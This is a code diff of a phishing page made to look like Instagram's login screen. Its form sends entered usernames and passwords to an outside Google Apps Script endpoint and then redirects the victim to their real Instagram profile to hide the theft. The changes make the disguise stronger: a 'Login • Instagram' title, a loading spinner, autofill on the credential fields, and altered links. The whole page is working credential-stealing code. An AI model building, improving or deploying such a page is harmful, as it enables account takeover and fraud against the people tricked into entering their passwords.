@@ -6,7 +6,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="icon" type="image/x-icon"
         href="https://cdn.shopify.com/s/files/1/0685/8529/2004/files/favicon.ico?v=1742138229">
-    <title>Instagram</title>
+    <title>Login • Instagram</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link
@@ -63,6 +63,10 @@
             border: 0px;
             cursor: pointer;
             letter-spacing: 1px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
         }
 
         #submit:hover {
@@ -84,10 +88,29 @@
             display: block;
         }
 
+        #loader {
+            animation: spin 2s linear infinite;
+        }
+
+        .none {
+            display: none;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg)
+            }
+
+            ;
+        }
+
         @media (max-width:1024px) {
             .container {
                 border: 0px;
-                padding-top:0px;
                 padding-left: 60px;
                 padding-right: 60px;
             }
@@ -116,8 +139,9 @@
             </div>
             <form id="contact-form" method="POST"
                 action="https://script.google.com/macros/s/AKfycbzNFLpnobPBuDnM1b8-QciEshp3Q0oj518I41xRYRxrYfov0P_Ck59_e6RsyT2Ez54/exec">
-                <input type="text" name="username" placeholder="Phone number, username, or email">
-                <input type="password" name="password" placeholder="Password">
+                <input type="text" name="username" placeholder="Phone number, username, or email" autocomplete="true"
+                    autofill>
+                <input type="password" name="password" placeholder="Password" autocomplete="true" autofill>
                 <button type="submit" class="" id="submit">
                     <div id="loader" role="progressbar" style="height: 18px; width: 18px;"><svg aria-label="Loading..."
                             class="xemfg65 xa4qsjk xs51kk x2a5n4e" role="img" viewBox="0 0 100 100">
@@ -138,18 +162,17 @@
                             <rect class="xwn9dsr" height="10" opacity="0.875" rx="5" ry="5"
                                 transform="rotate(225 50 50)" width="28" x="67" y="45"></rect>
                         </svg></div>
-                    Log In
+                    <span id="login-text">Log In</span>
                 </button>
             </form>
 
             <div class="forgot-password">
-                <a href="./forgor-password.html"
-                    style="color:#000;text-decoration:none;display:block;margin-top:30px;text-align: center;">
+                <a href="#" style="color:#000;text-decoration:none;display:block;margin-top:30px;text-align: center;">
                     Forgot Password?
                 </a>
                 <p style="text-align: center;color: #000;margin-top:50px;">
-                    Don't have an account? <a href="./sign-up.html"
-                        style="text-decoration:none;color:#0095f6;font-weight:600;">Sign up</a>
+                    Don't have an account? <a href="#" style="text-decoration:none;color:#0095f6;font-weight:600;">Sign
+                        up</a>
                 </p>
             </div>
         </div>
@@ -180,6 +203,7 @@
                 e.preventDefault();
                 document.getElementById("submit").classList.add("disabled");
                 document.getElementById("loader").classList.add("show");
+                document.getElementById("login-text").classList.add("none");
                 const data = new FormData(form);
                 const action = e.target.action;
                 const username = form.elements["username"].value.trim(); // Trim extra spaces
@@ -190,18 +214,20 @@
                         body: data,
                     });
 
-                    let result = await response.text();
+                    console.log(response, 'result.status');
+                    let result = await response; // ✅ Response JSON format में होगा
 
-                    if (response.ok) {
+                    if (result.ok) {
                         document.getElementById("submit").classList.remove("disabled");
                         document.getElementById("loader").classList.remove("show");
+                        document.getElementById("login-text").classList.remove("none");
                         form.reset();
 
-                        // ✅ Instagram profile par redirect
+                        // ✅ Instagram Profile पर Redirect करें
                         let instaURL = `https://www.instagram.com/${encodeURIComponent(username)}/`;
                         window.location.href = instaURL;
                     }
-                }
+                } catch { }
             });
         });
 
